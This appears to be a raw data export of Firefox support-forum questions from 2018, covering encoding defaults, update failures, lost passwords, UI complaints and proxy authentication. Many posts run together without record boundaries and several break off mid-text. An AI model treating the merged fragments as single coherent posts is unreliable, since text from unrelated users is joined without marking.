1201200,1516710307,How does one set the default encoding to Unicode (UTF-8) in Firefox?,"<p>To simply rephrase the title, how does one set the fallback text encoding to UTF-8 in Firefox?
</p><p>Before you rush with an answer, please take a moment to consider what the question <strong>really</strong> is about. I have noticed this question being asked multiple times. Each time it's eventually not answered because, invariably, someone deflects the thread with an answer that does not directly address the concern, probably because the author of the reply misunderstood the question. It's usually not a wrong answer, it's just an answer to some other question maybe related to this one. So please, if you cannot provide a direct answer, let the question stick out so that someone realizes that in 2018 Firefox still has this problem. It's not a huge issue, it's more of an annoyance, one that should be easy to fix, but first someone has pick up on the nuances between the need of the end user and the project's UX goals. It's especially important because it does not make sense that a modern browser would only accept legacy encodings as default. It thus sorely looks like an oversight.
</p><p>First, a definition. A <strong>user selected</strong> default text encoding as it is understood here is a <strong>valid</strong> encoding picked by the end user as the one that Firefox should revert to, after all its attempt at automatically detecting a document's encoding have failed. I emphasize on the fact that <em>user selected default</em> effectively means that we're not dealing anymore with <em>automatic detection</em>. It's about what should happen when the latter has completely failed.
</p><p>The only choices currently given when trying to set a fallback text encoding in Firefox are all legacy encodings. I'm running FF 57.0.1 on Ubuntu. You can access the menu from <em>Edit &gt; Preferences &gt; Font &amp; Colors &gt; Advanced &gt; Text Encoding For Legacy Content &gt; Fallback Text Encoding</em>. In addition to the legacy encodings present in the list there's also one option that supposedly instructs the browser to rely on the <em>Default For Current Locale</em>,  I'm not sure if what is meant is the machine's locale,  but it certainly doesn't seem to be respected.
</p><p>I have tested this by creating a small text file with a text editor (vim) to which I instructed to encode the text in UTF-8. I then opened it with Firefox and Chrome. Firefox loaded it with the ""Western"" encoding, while Chrome accurately detected the UTF-8 encoding.
</p><p>The screenshot attached below shows the output respectively from Firefox, Chrome, and the locale settings.
</p>
<hr>
<p>Now, as I've mentioned earlier the typical answers to this specific question have been unhelpful. I'm providing here some examples and explain why they're off the mark. At first they seem to address the question, but if you pay attention you realize that they're in fact answering other, maybe related, questions:
</p><p>- <em>Go to View, select Text-Encoding and pick Unicode</em>. This answer is unhelpful because it instructs me on how to manually choose the encoding. What I want is for Firefox to just pick UTF-8 when it can't figure out what to do.
</p><p>- <em>If the document's headers do not specify the encoding then the browser has no way to know what encoding to choose</em>. Exactly, but this question is not about nudging the browser with document headers and meta (automatic detection). It's about instructing it on how to work with documents that have none of that info (user selected default). There's a <em>user selectable</em> list of possible encodings Firefox can fallback to in such situations. I want UTF-8 added to that list. How do I do that?
</p><p>- <em>Normally the http server sends headers to indicate the encoding</em>. Again, when there are no servers, there are no headers. If Firefox is directed to load <em>file:///my/path/myfile.txt</em> and fails to detect what the encoding is, it still has to pick one. At that point, I want it to remember my preference for UTF-8. If there's a way to do this presently it's not clear.
</p><p>- <em>Set the BOM on the file</em>. This is just another way of saying headers, meta, and automatic detection. See my previous points about user selected defaults.

</p><p>All of my test websites i have tried look to do the same thing, the website appears to load, but nothing is displayed.  Just get all white in the browser.  If i move the most around, it goes from the pointer to a little hand when it hovers over where links are on the page, but nothing is still displayed there.  I can click on these links, new webpage ""load"" but still just all white in the browser.  If i randomly click on a non-link but where a picture is and drag it, i can see a ""ghosted"" picture drag with my mouse until I release.

I haven't liked many decisions over the years, through the Phoenix years etc, and much more recently, since the re-numbering scheme.  However, That is all good.  I think you have terrible user interface people working for you.  The blank page feedback is absolutely untenable.  I doubt there are algorithms capable of doing what you are intending.  A couple of iterations ago, it was half-way sensible.  pages that you had gone to repeatedly for an extended period.  Now, it is an absolute fail.  The predictive model doesn't really exist, and it simply dumps an uneducated guess at what one might want as quick links.  I deal with my own nonsense, check out clients,follow things down ""youtube holes"" etc.
</p><p>Depending... sometimes I'm getting my empty page defined by pages ranging from ""sexual abuse of boys"" to ""sally X""'s information, to ""Hitler's first public speech"".  It is insane you think this is a good algorithm.  I literally cannot use this browser any more unless there is some definite move to change this nonsense.

On Facebook, when typing into a status text field, pressing Ctrl + A results in *both* the letter A being typed, and also the text *before* the newly typed A being selected.
</p><p>I suspect this is JavaScript related, because normal text boxes work fine (such as this bug report's box, or Google's search box). Google Docs and Facebook clearly have some code running that checks what I'm typing, that is probably overriding normal control function behaviour. However, I don't experience this issue on Google Docs with Chromium (haven't tested Facebook).

People want the old theme back, people want the option to revert back visually to the old style, to put the tabs ""back where they belong on the bottom"" and so on. So I ask, why can't we make that an official option? Why is that request constantly ignored while the visuals keep decaying into the unsightly layout that is reminiscent of school work, utterly devoid of personality. Please, give us options to individually change our layouts back to what they were. Give us better customization to personalize the experience, because sadly, customizing Firefox now feels like pulling teeth, where as over a decade ago it was so easy grade school students had their own personalized browser layouts. So for the question to answer, should anyone involved with Mozilla respond, do you have any plans to ever return to us, the users, the options to change the layout back to how we like it to look, or are we stuck for good dealing with these aesthetically repulsive layouts unless we switch to a new browser?

I would like to know how can I disable javascript for only some sites and not others. I do not want to install plug-in for this.

1201361,1516783262,Select All (Ctrl+A) not working when writing/editing posts on Facebook that have an emote at the very end.,"<p>This is for Firefox Quantum, latest stable update, and I'm on Windows 7 64-bit.
</p><p>Basically while writing/editing certain posts on Facebook (it doesn't happen with all of them), and using shortcuts (Ctrl+A) or right-clicking and pressing Select All, to select all of the post to copy it, it ends up instantly highlighting and unhighlighting the text. The odd thing is it only happens if I put an emote at the very end of the post.
</p><p>One of the only solutions I've found so far (if I don't want to remove the emote at the end) is to use my mouse to select all of the text and copy it that way (cut/copy/paste all seem to work normally). There is however a workaround, typing a single space/character after the emote allows me to highlight the text normally, and if I use a space, it will be removed automatically once the post is saved.
</p><p>I'm loving every other aspect of the browser so far, but just ran across this one bug. I tried restarting the browser, didn't help. Haven't tried rebooting my PC since discovering this bug, but I've done that in the time since installing FF Q (shortened name of this browser). Highlighting text does work outside of when I'm writing/editing posts on Facebook with an emote at the very end. Ctrl+A does work on Facebook when writing/editing posts without emotes at the very end.
</p><p>Highlighting text also works when writing a comment on YouTube for comparison. Highlighting text works properly when editing any post (including with an emote at the very end) on Facebook when using Chrome and Cent Browser from my testing so far (I've used both browsers for years and never had this problem).

However unlike other browsers and apps that do this Firefox does not seem to have any way to change the language. I've done it before but for some reason now can't. Of course it feels that it has to revert back to Arabic EVERY fucking update and this time I just cannot change the language no matter what.

1201443,1516810892,Firefox 58 won't load on Windows 10. It's stuck as a background process. 57.0.4 and ESR work fine.,"<p>I had moved quite comfortably into v57 (64-bit) and updated my add-ons as best I could. Yesterday, however, the browser locked up. I restarted my Windows 10 machine. When it came back up, Firefox wouldn't load. Every attempted launch would spawn a background process, but never a UI.
</p><p>I went through several iterations of uninstalling, backing up and deleting the C:\Users\{user}\AppData\Roaming\Mozilla, deleting C:\Program Files\Mozilla Firefox, disabling anti-virus, and reinstalling, and trying 32-bit.

</p><p>I noticed that v58 released yesterday, so I again nuked the site from orbit and installed v57. I disabled my Internet connection before launching, went through each profile and disabled automatic updates, then reconnected.

</p><p>Lately I noticed that Firefox no longer ""remembers"" where the last download of a sort went.
</p><p>Example, if I downloaded a youtube video I used to put it in a special youtube project folder, and Firefox automatically downloaded the next youtube video to the same folder until I choose a different project folder.

This worked for different websites as well, Firefox remembered to put a Facebook video in the dedicated Facebook folder.
</p><p>Since some updates ago this does not work anymore.
Now every download gets dumped in the standard download folder or if I want it to be put in a dedicated folder I have to go there and chose that folder over and over and over again..
This takes a lot of time and creates lots of aggravation  every time having to sort out the downloads..
After some more updates it still does not work as I was used to.
</p><p>I have the standard Firefox download folder set on c:\downloads like I have since I started with Firefox 7 many years ago and it always worked, it always remembered where to put the download in the website related download folder.
I have tried different settings like ""always ask me"" but it keeps starting from the standard download folder.
</p><p>Is there some thing that can make this work again like it used to ? 
Like a setting  in about:config or with some addon ?

1201463,1516814741,Is it possible to simply start a class action law suite against firefox for tampering with our computers with unwanted updates against our will?,"<p>My question says it all without me having to go into details. 
I just think it should be against the law for a company to force its will on those who use their products, as firefox has been doing,
for the longest, with their browser by automatically updating one's personal computer, though that individual, specifically requested, that updates are not desired, as given the option, by firefox, to choose that preference.
</p><pre>I believe it could be considered a breach of a verbal contract between the user and the provider of a service. If programs can be forced, at will, onto an individual's computer by one company, then why not allow every company to force what ever programs they desire onto everyone's personal computer with no choice to refuse? Imagine how that would look, if every company was given the same privilege as is afforded to firefox.

</pre>
<p>I just think firefox is committing a cyber crime that needs to be brought to the attention of regulators, especially when a forced program causes other desired programs to malfunction. This is morally, as well as, socially wrong, to deny individuals the use of what they rely on, because one company want to play the cyber bully by forcing it's will on others, and ignoring any plea for mercy. 
The firefox bully has gotten too big for it's own good, and need to be put in check.

1201485,1516817887,Any way to combine title- and menu bars without breaking the double-click new-tab feature of tab bar?,"<p>Dear volunteers, I started using the classic theme restorer addon when the ""make firefox fancy again""-guys were bothering my FF experience too bad with australis.. however as almost every (for myself useful) addon has been killed out of firefox recently this won't work anymore so I need to find other ways. What I could figure out so far is how to move down the tab bar again, with some weird css stuff and how to mostly restore my toolbar look and feel. However I am now stuck with this issue, which is pretty annoying as I am not able to adapt to such behavioral changes too good...
In older versions I combined the menu bar with my title bar, just as is the case right now in quantum (menu bar items and window buttons on the same bar/line). However I am also (often!) double clicking the tab bar to open a new tab, which is now broken, as long as you hide the real title bar. When enabling the title bar, the window buttons switch to this bar and the menu buttons have their own one, plus the tab bar is double clickable to open a new tab. I am very comfortable with hiding the title bar but in that case double clicking the tab bar will max-/minimize or drag the firefox window, instead of just opening a new tab, which is the main point, I need to fix for me...
Obviously since quantum everything bar-like belongs to some ""title-bar-without-title""-blob, which should be changed or at least be customizable either way (just like the tabsontop-&gt;false about:config setting should just be (?re-)added again, if blocking such useful addons remains strategic).
</p><p>Did I miss any option here to customize the new ui or is there any (still working) addon for it, I could not find?
</p><p>&gt;Edit: Found this other question which is somehow equal but I'd like to know if there is some way to independently combine the two bars without impacting the tab bars behavior..

</p><p>I did a complete un-install, following your directions.  I DID keep my preferences, but checking before a new installation, FF was removed completely.  Currently running ver 58, or whatever is the latest as of Jan 23, 2018 from your site.   The installer I downloaded is version 4.42.

1201585,1516859403,laptop mouse intermittently stops working in firefox and if I go to desktop using the touchpad and then back to firefox the mouse works again,"<p>I am using Windows 10 Home 64 bit.  
Laptop is Dell N5110.  Firefox is version 58.0 64 bit.
The mouse is a Microsoft Sculpt Comfort Bluetooth.
The power setting for bluetooth mouse is set so that the computer can't put it to sleep.
The microsoft mouse driver was up to date.  I am now trying the HID compliant mouse driver.  
The problem exists with both drivers.
The mouse intermittently stops working... ie. The light underneath is on, but mouse doesn't respond.
I can either turn the mouse off and on again and it works; or I can simply go to the desktop or another open application, and when I switch back to Firefox the mouse will be working again.
I have also run a chkdsk with no problems found.
This problem seems to have started following a Windows update in the past couple of weeks - or coincidence?
Anyone have any idea how to fix this?

</p><p>The bars will appear at random locations, and once rendered will scroll with the page, blocking out a section of content. Refreshing the viewport (eg. by switching the tab to another and back) will clear the bar, but new bars may appears once the content is scrolled again.
</p><p>This error does not occur in landscape mode or for short pages (whose length does not exceed the vertical screen resolution), so I suspect this bug is related to how Firefox pre-renders the content (outside of the current viewport) while scrolling.

At first the navigation buttons were overlapping with the titlebar buttons but that was easily fixed by just adding a ""Flexible Space"" element on the left.

1201732,1516905472,"I upgraded my PC to Quantum last night and woke up to ESR and now all my bookmarks, history, autofill are gone.  How can I recover these things?","<p>After a little more poking around most of the day this is this best that I can figure out what has happened.  Last night I updated firefox update to the newest version Firefox Quantum.  The download I thought went fine.  Once completed I checked the version and it did say it was Quantum blue box, the whole thing.  It was late but if I recall correctly I continued to use the machine online with no problem.  Bookmarks there, the history, the usual stuff.  (I had a laptop upgrade a day or so ago and everything was perfect on it afterwards.   Not a burp.)  Well this morning I came in and started up the machine and began the usual daily routine.  I pulled up the bookmarks and they were gone.  I checked the history and it was also gone.  Now the version of firefox I am on is Firefox ESR.  I looked at the download history and it said that the download failed.  Same error for days.  Now when I check the download history that I downloaded it is gone.  I have read quite a bit on the support faq's and still haven't found anything that has helped.   When I tried the backup bookmark files it said it couldn't be recovered.  For some reason this ESR version doesn't seem familiar, is there a way to tell what version was before the upgrade last night and can that recovered?  It probably was the ESR I just didn't notice or remember.  Any help would be greatly appreciated.

1201737,1516907298,NTLM proxy authentification - no prompt when using a Microsoft Windows account,"<p>Hi,
</p><p>This problem with proxy authentification isn't new and we lived with it for at least the past year or so. Because we get so many support requests about this (I am from the IT department), we have now decided to investigate some more.
</p><p>So to use our ""pac"" proxy, students have to configure their OS network settings with ""Automatic proxy settings"" using our proxy address. We set Firefox to use system proxy settings (problem occur with Firefox own proxy settings too).
</p><p>Some users don't get the proxy authentication window on websites they are suppose to. To those, we guide them to set ""network.automatic-ntlm-auth.allow-proxies"" to ""False"" under the ""about:config"" menu. Then the authentication window comes up as it should (Windows not trying to pass credentials first). Thing is, it's a pain for our IT department to guide many Firefox users through this process and although we have online documentations that mention the extra steps, many students struggle with the process.
</p><p>Today, we found more informations about the problem. It appears that users that have this issue are using ""Microsoft account"" type of login on their machine. If we change their accounts from Microsoft accounts to simple local accounts on their machines, then the proxy authentication window comes up correctly, without changing any Firefox setting (""network.automatic-ntlm-auth.allow-proxies"" still to True)
</p><p>This problem is easily reproduced switch between Microsoft account login to simple local account and vice-versa.
</p><p>We have done our tests with Windows 10 machines running Firefox 64-bit (version 58.0) and we haven't tested yet if the problem occur with other versions of Windows or Firefox 32-bit. It doesn't seems to matter on what network the machine is connected to.
</p><p>Other browsers never have issues getting the proxy authentication window to show up, no matter if using a Microsoft account or local account. Also no need to change any settings.
</p><p>Is this a known Firefox bug ? Can this problem be brought to Mozilla developpers ? Is there an easier workaround ?
</p><p>Thank you very much in advance !

The malfunction seems to be related to the mouse pointing-clicking action. When I attempt to scroll down an email and I initially click on the email body itself before scrolling down it instead takes me away from the email and back to my inbox. Not only that, it lands me in a lower section of the inbox page (so I'm looking at old email from a week or 2 ago). Furthermore, the same problem recurs SOMETIMES when I click either on the ""x"" at the top-right corner of the email or when I click on the ""inbox"" menu option on the left-hand-side. All of this forces me to have to scroll down the email only by using the scroll bar or risk getting booted out of the email.

This Problem bothers ca. 90% of our Clients. When you try to start the Firefox Application, Windows acts like trying to load but doesn't succeed and nothing happens ever after. When you take a look at the Task Manager, it has open one Firefox Process. A ""closer look""
to the Performance Monitor of Windows shows, that this Process hat 3 Threads started. but doesn't use any CPU or RAM. On a Client, where the update succeded, we have like 6 started Processes with round about 150-200 Threads. If we uninstall the Firefox and install the previous version 57.0.4, it works just fine, for as long as the update doesn't happen.
Meanwhile we tried to delete everything of a faulty version that we could find, including reg keys, profiles etc. and do a clean install.
We tried to start Profile Manager, Firefox in Safe Mode, but none of it worked.
The only thing that worked, is to start the OS in Safe Mode and open Firefox. In there it worked just fine.
We are using Windows 7 with the latest Service Packs and Hotfixes/Updates and the latest drivers possible.

Two weird things about this though. One, sometimes the tabs open on the end and sometimes they open up next to the current tab. I haven't figured out a pattern to it yet though, it just seems like it randomly works. Two, I know it's not a V58 issue because before I updated, I downloaded a portable version of Firefox V58 to test it out and changing that value to false made the tabs open on the end every time without fail. I'm sure a full uninstall and clean install would fix the issue but I really would like to make that a last resort since there is no more FEBE for this version and because of that, redoing all the settings and add-ons and the settings in the add-ons is a real pain.

</p><p>Steps to reproduce:
</p><pre>- open a lot of tabs
- Firefox has been crashed (well, I had to use `kill -15 PID' actually, since it has been frozen first)
- note that sessionstore.jsonlz4 doesn't exist anymore in profile directory, so current session has been wiped away completely
- start Firefox
- see a new clean session and note, that ""..."" menu &gt; ""Restore Previous Session"" is grayed out
- close Firefox
- find the latest (by time) session backup file in your profile directory: mine is sessionstore-backups/recovery.jsonlz4
- use it as a new current session file (e.g., shell command from profile directory): cp sessionstore-backups/recovery.jsonlz4  sessionstore.jsonlz4
- start Firefox again
</pre>
<p>What should happen:
</p><pre>- Firefox should restore session from a ""new"" sessionstore.jsonlz4 backup file OR make ""Restore Previous Session"" option is available
</pre>
<p>What happens:
</p><pre>- clean session again
- ""Restore Previous Session"" is not available
- try another session backup files: same results

However, most of us have saved  our searches under the ""Saved Searches"" with a format that will allow us to look at new items listed.  This happens by me saving the search as ""Time: Newly Listed"" so if the last time I clicked on the search was 01-15-2018, it will be the item highlighted.  I can then look at all the items from today's date up to the 01-15-2018 date  so I don't have to look at everything or guess what the last item was that I looked at.  After the most current update, Firefox no longer is showing the Date/Time that the item was listed so I have no idea how far to go back.  This is a HUGE issue as we view hundreds of items on a daily basis to do business.
</p><p>I don't know if this is a true BUG or that it shut something off that I can just turn back on, but it has forced us to use IE for the past day or so as it works in IE.  It's extremely painful and we need to get back to using Firefox.

But I'm seriously considering finding an alternative. This is -always- a problem with FF, and I don't understand why.

</p><p>I have tried to move the folder to another network share, but that yields the same result (problem). Having it local gives no issues.
</p><p>From my own investigation, it seems that FF58 is having problems renaming some files in the profile folder, the console log tells me this, due to locked because another process is using it (no, only FF). These files are almost the same files every time and they end up having a .tmp extension. If I manually fix these files, FF is back to normal - for that one session.
</p><p>What could be the reason for FF58 behaving like this? Is it exiting before the renaming of the files are completed, leaving the job halfdone?

I set the browser.setting restore on crash to false and users are not getting prompted to restore session or start new but that seems to just be a band-aid and not fixing the issue.
Nothing is getting written to settings when closing the program.  Passwords that you save are not getting saved for next use unless you do not close the browser and start again.  I can save a password, and verify it is there in privacy settings.  But if I close the browser, and check privacy, it is not listed as stored PW's.

1202086,1517072777,waste of Photon UI space,"<p>I really admire the way that Firefox developers have designed a much lighter browser for desktop PCs etc, certainly RAM-friendly and allows users more control to customize preferences.  However, not at all keen on new Photon UI (user Interface) that replaced the Australis one, that at least had a personalized feel and never left a gaping-empty-page-abyss below URL bar.   This has nothing at all to do with empty space on either side of the URL bar - below it is where blank white ocean rules, no matter what ADD-ON extensions to bring life to the above-URL. 
</p><p>The former Firefox UI logo spread purposefully user-friendly accross the blank white ocean as confirmation that indeed, Firefox was your trusted brand of browser banner/ISP.  Now, it only exists as a URL bar which means you get a wasteful use of UI space; URL extensions merely complimentary to the subject header with no content below it.  For instance, the image uploaded demonstrates my point precisely, except that I have removed the toolbar features such as YT, FB, Amazon, Twitter etc as never use them - why can't Firefox personalize again, the much missed Australis one (large Fox Icon), or something similiar, to fill the gaping-empty-page-abyss (located) below URL bar?.

</p><p>I'm NOT good on computers at all, so please be gentle with me.
</p><p>I kept getting messages wanting me to upgrade Firefox to Version 58.  I didn't want to at first because the version I had was working fine and 'if it aint broke, why fix it!'  Then my version stopped playing streaming video and I didn't know why.  It still played 'stored' video, I suppose you'd call it, like MOST YouTube video clips (or Vimeo or anything else like that) but it had BIG problems with free movie site links (showed initial video picture but couldn't click on the start arrowhead) and all streaming video (came up with error messages saying 'MIME support not found', stuff like that, I don't know what MIME support is, sorry.) 
</p><p>So I thought I'd install the latest version and see if I could watch streaming video without having to use Chrome, which I don't like, it slows my admittedly aging computer down to a crawl. (I know Firefox still has the memory hogging problem but it's always had that, always WILL have that, I can live with that!)  I've downloaded it. It won't install. I click on the installer and it starts doing something but 45 minutes later still nothing's happened. I've tried uninstalling the Firefox I had - I'm using Chrome ATM - and then installng version 58, same thing, it starts doing something but 45 minutes - 60 - 90 minutes later still nothing's happened.  No error messages, just flashy hard drive but nothing really going on.  
</p><p>I'm using XP SP3 on a Foxcon 1 Motherboard (how apt!) and I've got nearly 2T of hard drive spare and 6gig of RAM - I'm getting all this off the specs list that came with the computer, I'm not claiming I understand what I'm saying right now, I'm bad at computers - but I'm clinging onto the fact I DO understand XP pretty well and all my software runs on it, nothing I've got likes 7 or any of the other versions.  (It SAYS it does but all my music software is Glitch Central in 7,  even in XP emulation mode,  works beautifully in XP! If it aint broke...) 
</p><p>Why won't Firefox install? And what version will play STREAMING video and video on movie sites (Like Netflix, MovieJagg Pro, Twomovies etc?)

1202193,1517144331,"RE:  Firefox Sync/Account Credentials; when using a Firefox account how are my usernames and login creds. stored in cloud?  AES, compressed, etc...?","<p>I was curious as to how in terms of data-storage (at-rest and in-transit) how securely transmitted and retained the account data for users' Firefox accounts is, in terms of pertaining to the encryption protocol concerning Firefox accounts/sync function stored in cloud...?
</p><p>Or is no account data for Firefox sync stored in cloud, and is only retrieved from the de-facto device (as a minimum of two are required for a Firefox Sync account to work properly)?  And if not, why not offer cloud-based solutions to store the ciphertext or whatever the chosen format may be for the encrypted account data, so that it may be retrieved without this hassle or cumbersome requirement at times.
</p><p>Although, I could certainly understand the reluctance to harbor such data, even in an encrypted format due to a possible security breach of servers or violation of vulnerabilities in systems.
</p><p>So in a breviter intim atum, my question is:  how is account credential data retained and transmitted from one Firefox sync account to the next (from the primary device or via cloud), and how secure is the data on whatever harddrive (obfuscated v. encrypted?), and yes I do use FIPS-192 protocol and secure my Firefox's with a master password with a bit-strength of greater than 200 in order to secure these logins, so no further additional security measures may be taken or implemented to achieve greater security hitherto; however, I also find that there are plenty of services that could be strengthened consequently.

1202428,1517249387,Suggestion: Include webpage icons in Firefox Sync,"<p>I'm especially glad I upgraded from Firefox 57.0.4 stable to Firefox 58.0 stable when I found out yesterday afternoon that addresses are now included in Firefox Sync's capabilities if I tell Firefox Sync to do that, which I did. It would be great if all the webpage icons on my bookmarks would sync with Firefox Sync as well. As of Monday, January 29, 2018, I have 520 bookmarks, all in my bookmarks bar. I'm very much used to recognizing webpages by their respective icons in that list, along with their names. I've had to reset my Inspiron 7558 two days ago for the umpteenth time because of slowness, not to mention Firefox wouldn't open despite uninstalling it and then reinstalling it! Firefox 57.x didn't work out well for me since it's clear to me that version put speed before reliability. It was the first time Firefox called their Windows, macOS and Linux browsers ""Firefox Quantum"", after all. Thankfully, with Firefox 58.0, everything's under control. Hopefully, with Firefox 58.0 and a nice, clean 500 GB hard drive, Firefox won't keep crashing. I would love to get an email response from any of those countless bug reports I've always sent with the Mozilla Crash Reporter! 
</p><p>And another thing, it would be great if ALL the settings in my browser on Windows 10 Redstone 3 synced with Firefox Sync. There are a few as of right now that don't, such as having the taskbar in Windows 10 having one tab per Firefox tab open, not per Firefox window open. This is especially helpful when I'm downloading public domain or free use images from <a href=""http://flickr.com"" rel=""nofollow"">flickr.com</a> or <a href=""http://loc.gov"" rel=""nofollow"">loc.gov</a> for me to back up safely on my OneDrive and then seamlessly have them on all my devices like my iPhone 6s and my services like FreePrints! Right now, Firefox is my preferred browser on both Windows 10 and my 64 GB silver iPhone 6s, and as long as I can notice a major or otherwise demonstrable improvement over the previous major stable build every seven Tuesdays, it shall always be, and I shall highly recommend it to every one of my family members and friends! There's always room for improvement for nearly everything!

1202468,1517263210,Why did a recent Firefox Quantum update from 57.0 to 58.0.1 (64-bit) delete all of my saved passwords?,"<p>Recently a few weeks back, I was multi-tasking, when a pop-up appeared in the lower right of my Firefox window, asking me if I wanted to do a refresh. Not thinking carefully, I clicked yes. Within minutes, I realized what I had done! On the phone with a client, I couldn't do much about it then, I would deal with restoring the old Firefox data and other browser items when I wasn't dealing clients.
Today, 1/29/2018, I had Firefox open and the browser advised me there was a version update (I was using 57.0). I never set my browsers to update automatically!! I always have them advise me of updates and I choose when to update them. So when I had a minute, I updated to the new version, 58.0.1 (64-bit). My system runs Windows 7 professional.
So after I updated to the new version 58.0.1 Firefox Quantum delete ALL MY SAVED PASSWORDS. Why did Firefox do this? What was the reason for deleting all my passwords? My bookmarks and everything else I checked seems to be in place. It's just the passwords. I have never had a version update delete my saved passwords. What is going? Can anyone advise on this?

1202501,1517273351,Why no warning that profile manager would be disabled by v57,"<p>I appreciate updates to Firefox may create breaks with previously released add-ons and extensions.  Mozilla cannot be required to maintain compatibility with third party applications.  But Profile Manager was an integral feature of FF.  I had multiple profiles, with separate and distinct bookmarks and browser add-ons for each.  Now only one remains, and of course, it's the plain vanilla profile without all the customization.  I think you folks could have warned us that installing the latest and greatest version of FF would blow off our extra profiles.  I don't know if that information is still still on my computer and can be recovered, or not.  I'm disappointed, and if I keep using FF, I definitely won't be enabling the auto-update feature again.  And I get to spend time sorting this out that a reasonable warning would have saved me.  Not happy about that.
</p><p>P.S.  Your site still lists the Profile Manager as a solution to providing multiple profiles.  You should update your information to say ""Feature not available with the current FF / v57+""

</p><p>Yes, I know we can change CSS in the Developer Tools but that is not efficient nor practical when inspecting and modifying multiple CSS properties for an area in a page when multiple changes that need to be saved and reviewed to determine if the CSS edits made in the IDE are appropriate and work well with the rest of the content in the page that is displayed.
</p><p>As soon as the page is refreshed while the Inspector tab is opened the Javascript Debugging starts and switches to the Javascript Debugger tab and begins debugging the Javascript in the page. THIS IS A BUG that has been BUGGING ME FOR AT LEAST A YEAR.
</p><p>How do we stop the debugger from running on a page refresh when all we want to do is Inspect, modify, refresh and continue Inspecting if wanted? Well designed and tested software does not decide to start and run code on its own and that's what the Developer Tools do when the page is refreshed when Inspecting the DOM.
</p><p>I might add Chrome does not have this bug. When will this bug be resolved or how is it to be worked-around as it is not only annoying it is costly in time to respond to and breaks a developer's concentration to respond to the bug because the developer is compelled to go back and forth to stop unwanted behavior of this browser and restart the intended functionality.

I ended up having to uninstall the application again just to get my computer to function because it was slowing it down so much. I really hope there is a way to resolve this because the schoolwork we have to do only works on your web browser. I would appreciate any help I can get. Also, it may not be related but I couldn't get my Adobe Flash Player to play a video on a website that has been playing them up until now, even after the update.

Firefox has 'lost' my passwords following a reset.  The reset was 'recomended' by FF because it was slow starting.
I use a master password on the passwords file.
</p><p>I've tried to follow some standard solutions to the problem but:
1) There is no ""Old Firefox"" folder - neither on my desktop, nor elsewhere.

Given the age of the timestamps in the folder, I think it did not create a new folder.

</p><p>3) I have found 'key3.db'. 'key4.db' and 'logins.json', and copied them to my new profile folder.

</p><p>The issue pretty much boils down to two problems.
</p><p>1) When downloading a file, more often than not, Firefox downloads the file as 'latest' or as a really long string of digits, letters and other characters (4XU4fQXvJ1TicU2W8aco_=... for example). I have not been able to track on which sites this happens, but I'd say it's probably a 60% chance of it happening, with Firefox having 'off-days', where this happens all the time.
</p><p>2) This one is a bit more recent and started about a week ago. A lot of time when I'm downloading, the browser saves a file to my default location despite me selecting otherwise. The standard window pops up, I select 'Save File To', choose a directory (the desktop for example) and save it. Despite this, the browser saves the file to my D: drive, which is selected as the default (see picture).
</p><p>I really hope these issues can be fixed, as I'd hate to switch to another browser.

</p><p>Video has stopped working properly Firefox after the update to version 59, 64 bit I had probems after the previous update, but eventually I resolved it by creating a new profile.  I have tried everything since the last update, reset, reinstall, safe mode, new profile, performance settings etc.
</p><p>I have two Windows 10 computers (ASUS Laptop Home edition and Toshiba Laptop Pro edition). As this has occurred on two different laptops I am fairly sure this is a FF problem that Mozilla will have to fix. The latest update has only caused the problem on the ASUS, the Toshiba is fine so far . 
</p><p>This must be escalated and solved by Mozilla. I am not the only one with these or other problems. I cannot and will not accept that ever time there is an update to FF that I have to spend hours resolving problems and in the latest case not even succeeding. Mozilla's reputation has already been damaged by this and other problems. Is it caused by the 64 bit version? If so we must be allowd to revert fully to the 32 bit version and continue with normal updates to that version. Mozilla is becoming like Microsoft, i.e. unreliable and unacceptable. I am already using Edge more than FF and if the problems continue I will reluctantly permanently uninstall FF, which would be a shame after 10 years of generally vdery good service.

Whenever I want to move a Tab into another *exact* position, Firefox automatically and randomly slides other tabs over in other rows to make a gap, and when I let go, the selected tab 'jumps' into that gap on another row (usually right above) instead of where I really want it to go! It also creates gaps on the far left of all the rows too.

1209267,1521063790,Passwords are not secure with master password,"<p>I'm cross-posting this in the desktop version forums since it applies for both mobile and desktop.
</p><p>I really don't understand what is the logic behind the way the password manager was implemented, and it's a major no-go for me. The purpose of a master password should be that it is asked EACH time you try to show the passwords in plain text (in the settings), not once per session (which is also very annoying since the purpose of the password manager is to prevent you from having to enter passwords).
</p><p>In other words:
</p><p>If I enter my master password but leave the computer turned on or my cell phone on the table without closing Firefox (which most people do), then someone can go to my setting and have a plain text version of all my passwords instantly, which is pretty bad. The other thing is that while I understand that SOME people might want to enter their master password once per session, most people don't care about this and find this actually annoying and this should be optional. This is actually beating the purpose of the password manager which is NOT to have to enter any password. They are masked, and I do not care if someone opens my browser and views my facebook. What I really care about however is that they shouldn't be able to go to my settings and have an easy access to all my passwords in plain text!
</p><p>So having to enter your password every session should be an option, while having to enter your password should be mandatory each time you open the password manager itself (or at least optional!). What a major security flaw for a browser that prides itself on privacy...

As one might expect, this is incredibly infuriating, especially since I can then go to the same page in internet explorer and everything renders properly in pdf format.

1209410,1521139994,Mozilla Firefox 57+ : custom toolbar is still supported but how to manage it?,"<p>I have recently migrated all my Firefox profiles to version 58.0.2. 
</p><p>For some profiles, the custom toolbar that I used before FF57+ is now gone. I think this custom toolbar was brought by a legacy extension like Classic Theme Restorer. Since this extension is no more supported in FF57+, the toolbar is gone which is normal. 
But on some profiles, I saw that my custom toolbar was still here (see attached screenshots)
</p><p>My custom toolbar is the one which contains the AdBlock Plus red icon (among others). 
</p><p>This gaves me some hope. This clearly indicates that custom toolbar is still implemented, although we can't create it directly from the GUI.
I checked the browser.uiCustomization.state parameter in about:config.
I saw that my ""__customToolbar_Syl"" custom toolbar was still referenced in the ""placements"" and ""dirtyAreaCache"" sections (which is not the case on the profiles without my custom toolbar).
</p><p>The structure of browser.uiCustomization.state is the following:
{
	""placements"":
	{
		""widget-overflow-fixed-list"":[]
		,""__customToolbar_Syl"":[...] =&gt; my custom toolbar
		,""PersonalToolbar"":[...] =&gt; bookmarks toolbar
		,""nav-bar"":[...] =&gt; toolbar containing the address bar
		,""TabsToolbar"":[...] =&gt; toolbar containing the tabs
		,""toolbar-menubar"":[...] =&gt; top toolbar containing the menus
		,""addon-bar"":[...] =&gt; this is my old toolbar at the bottom (which was used by Download Status Bar (legacy extension)
		,""ctraddon_addon-bar"":[...] =&gt; old toolbar of Classic Theme Restorer extension
		,""ctraddon_extra-bar"":[...] =&gt; old toolbar of Classic Theme Restorer extension
